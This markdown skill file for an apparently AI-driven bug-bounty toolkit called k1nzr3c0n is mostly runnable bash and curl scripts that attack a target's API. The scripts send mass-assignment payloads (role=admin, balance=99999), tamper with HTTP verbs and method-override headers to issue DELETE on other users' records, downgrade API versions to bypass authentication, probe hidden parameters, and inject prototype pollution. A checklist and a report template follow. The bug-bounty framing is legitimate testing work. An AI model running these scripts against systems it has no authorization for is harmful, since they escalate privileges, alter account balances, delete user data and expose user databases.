---
name: k1nzr3c0n-hunt-api-misconfig
description: "API Misconfiguration hunting skill. Covers mass assignment (auto-assign privileged fields), prototype pollution, HTTP verb tampering (PATCH→PUT→DELETE), JWT non-crypto handling, undocumented parameters, API versioning bypass (v2→v1), shadow API discovery."
tags: [api, mass-assignment, prototype-pollution, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — API Misconfiguration

> **Mass assignment**: send extra fields in PUT/PATCH body — if server assigns them, escalate role.
> **HTTP verb**: replace POST with PUT/PATCH/DELETE — some ACLs only check one method.

---

## Crown Jewels

```
Priority 1 — Mass assignment: set role=admin or is_admin=true in profile update
Priority 2 — HTTP verb tampering: POST→DELETE bypasses ACL on same resource
Priority 3 — API version bypass: v2 endpoint has auth, v1 does not
Priority 4 — Shadow API: undocumented endpoints from old JS/Swagger
Priority 5 — Prototype pollution via JSON merge (Object.assign, lodash.merge)
```

---

## Phase 0 — API Discovery

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_api_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

RUNS_BASE="/app/runs"
echo "=== API Endpoints from k1nzr3c0n ==="
grep -rhoP 'https?://[^\s"]+/(?:api|v[0-9]+)/[^\s"]+' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/api_endpoints.txt" | wc -l \
  | xargs echo "API endpoints:"

echo ""
echo "=== API Versioning ==="
grep -oP '/v[0-9]+/' "$HUNT/api_endpoints.txt" | sort | uniq -c | sort -rn | head -10
```

## Phase 1 — Mass Assignment

```bash
echo "=== Mass Assignment ==="
BASE="https://${TARGET}"
SESSION_COOKIE="${SESSION_COOKIE:-}"

# Test: send extra privileged fields in profile update
PRIVILEGED_FIELDS=(
  '"role": "admin"'
  '"is_admin": true'
  '"admin": true'
  '"privilege": "admin"'
  '"level": 0'
  '"group": "administrators"'
  '"permissions": ["admin","read","write","delete"]'
  '"account_type": "premium"'
  '"subscription": "enterprise"'
  '"credits": 99999'
  '"balance": 99999'
  '"email_verified": true'
  '"phone_verified": true'
  '"kyc_verified": true'
)

for FIELD in "${PRIVILEGED_FIELDS[@]}"; do
  RESP=$(curl -sk -X PUT "${BASE}/api/v1/user/profile" \
    -H "Cookie: ${SESSION_COOKIE}" \
    -H "Content-Type: application/json" \
    -d "{\"name\": \"Test User\", ${FIELD}}")
  
  # Check if field was accepted
  echo "$RESP" | grep -qi "${FIELD%%:*}" && \
    echo "  [ACCEPTED] $FIELD → ${RESP:0:80}"
done

# Verify escalation
echo ""
echo "Verify role after mass assignment:"
curl -sk "${BASE}/api/v1/user/me" -H "Cookie: ${SESSION_COOKIE}" | \
  python3 -m json.tool 2>/dev/null | grep -E '"role"|"is_admin"|"privilege"'
```

## Phase 2 — HTTP Verb Tampering

```bash
echo "=== HTTP Verb Tampering ==="
BASE="https://${TARGET}"

# Test each endpoint with all methods
ENDPOINTS=(
  "/api/v1/user/${ACCT2_ID:-2}"
  "/api/v1/admin/users"
  "/api/v1/settings"
)

for EP in "${ENDPOINTS[@]}"; do
  echo "  Endpoint: $EP"
  for METHOD in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
    STATUS=$(curl -sk -X "$METHOD" -o /dev/null -w '%{http_code}' \
      "${BASE}${EP}" \
      -H "Cookie: ${SESSION_COOKIE:-}" \
      -H "Content-Type: application/json" \
      -d '{}')
    printf "    %-8s → %s\n" "$METHOD" "$STATUS"
  done
done

echo ""
echo "=== Method Override Headers ==="
for OVERRIDE in "X-HTTP-Method-Override: DELETE" "X-Method-Override: DELETE" "_method=DELETE"; do
  STATUS=$(curl -sk -X POST -o /dev/null -w '%{http_code}' \
    "${BASE}/api/v1/user/${ACCT2_ID:-2}" \
    -H "Cookie: ${SESSION_COOKIE:-}" \
    -H "$OVERRIDE")
  echo "  [$OVERRIDE] → $STATUS"
done
```

## Phase 3 — API Version Bypass

```bash
echo "=== API Version Bypass ==="
# v2 adds auth, v1 might not
BASE="https://${TARGET}"

# Find protected endpoint in v2
V2_EP="/api/v2/users"
V2_STATUS=$(curl -sk -o /dev/null -w '%{http_code}' "${BASE}${V2_EP}")

# Try same endpoint in older versions
for VERSION in v1 v0 v beta alpha internal; do
  EP="/api/${VERSION}/users"
  STATUS=$(curl -sk -o /dev/null -w '%{http_code}' "${BASE}${EP}")
  BODY=$(curl -sk "${BASE}${EP}")
  echo "  [${VERSION}] $STATUS: ${BODY:0:60}"
  [ "$V2_STATUS" = "401" ] && [ "$STATUS" = "200" ] && \
    echo "  *** AUTH BYPASS VIA VERSION DOWNGRADE ***"
done
```

## Phase 4 — Undocumented Parameters (Mass Assignment Discovery)

```bash
echo "=== Undocumented Parameter Discovery ==="
BASE="https://${TARGET}"

# Arjun-style parameter discovery
echo "Common hidden parameters to test in PUT/PATCH:"
HIDDEN_PARAMS=(
  "id" "user_id" "account_id" "uuid" 
  "role" "roles" "group" "groups"
  "admin" "is_admin" "superuser"
  "verified" "approved" "activated"
  "status" "state"
  "tier" "plan" "subscription"
  "limit" "quota"
)

for PARAM in "${HIDDEN_PARAMS[@]}"; do
  RESP=$(curl -sk -X PATCH "${BASE}/api/v1/user/me" \
    -H "Cookie: ${SESSION_COOKIE:-}" \
    -H "Content-Type: application/json" \
    -d "{\"${PARAM}\": \"admin\"}")
  echo "$RESP" | grep -qi '"success":true\|200\|updated' && \
    echo "  [ACCEPTED] param: $PARAM"
done
```

## Phase 5 — Prototype Pollution via API

```bash
echo "=== Prototype Pollution via JSON ==="
BASE="https://${TARGET}"

# Inject __proto__ in JSON body
PROTO_PAYLOADS=(
  '{"__proto__": {"isAdmin": true}}'
  '{"constructor": {"prototype": {"isAdmin": true}}}'
  '{"__proto__": {"role": "admin"}}'
  '{"user": {"__proto__": {"isAdmin": true}}}'
)

for P in "${PROTO_PAYLOADS[@]}"; do
  RESP=$(curl -sk -X POST "${BASE}/api/v1/settings" \
    -H "Cookie: ${SESSION_COOKIE:-}" \
    -H "Content-Type: application/json" \
    -d "$P")
  echo "  PAYLOAD: ${P:0:50} → ${RESP:0:50}"
done

# Test if pollution worked
RESP=$(curl -sk "${BASE}/api/v1/user/me" -H "Cookie: ${SESSION_COOKIE:-}")
echo "$RESP" | grep -qi '"isAdmin":true\|"role":"admin"' && \
  echo "  [PROTO-POLL] Admin flag set via prototype pollution!"
```

## Gate 0

```bash
echo "=== API Misconfig Gate 0 ==="
echo "  □ Mass assignment: role=admin confirmed in /api/user/me response"
echo "  □ Verb tampering: DELETE on /user/ID actually deleted user"
echo "  □ Version bypass: v1 endpoint returns data without auth"
echo "  □ Proto pollution: isAdmin=true visible in subsequent requests"
echo "  □ Impact: actual privilege escalation, not just response change"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Mass Assignment in [PUT /api/v1/user/profile]: sending role=admin in request body escalates account to administrator
HTTP verb tampering: [PUT /api/v1/users/2] allowed where [GET] requires authorization — allows modifying other users' data
API version bypass: [/api/v1/admin/users] lacks authentication present in /api/v2/admin/users — returns full user database
```
